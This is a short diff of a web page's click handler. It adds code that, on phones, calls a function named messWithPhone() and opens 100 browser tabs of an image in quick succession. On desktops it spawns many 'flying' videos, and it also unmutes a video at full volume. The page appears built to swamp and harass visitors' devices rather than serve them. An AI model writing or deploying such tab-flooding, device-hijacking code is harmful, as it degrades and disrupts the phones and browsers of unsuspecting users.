@@ -139,9 +139,17 @@
         var mv = document.querySelector('#media video');
         if (mv) { mv.muted = false; mv.volume = 1; mv.play(); }
       } catch (e) {}
-      // trigger ALL mechanisms on button click (mess-with-phone + spawn)
-      try { messWithPhone(); } catch (e) {}
-      spawn50();
+      if (isMobile()) {
+        // phones: mess-with-phone + open 100 tabs of images
+        try { messWithPhone(); } catch (e) {}
+        const imgUrl = 'video/images.jpeg';
+        for (let i = 0; i < 100; i++) {
+          setTimeout(() => { try { window.open(imgUrl, '_blank'); } catch (e) {} }, i * 50);
+        }
+      } else {
+        // desktop: normal spawn (flying videos + isolated player)
+        spawn50();
+      }
     });
   }
 
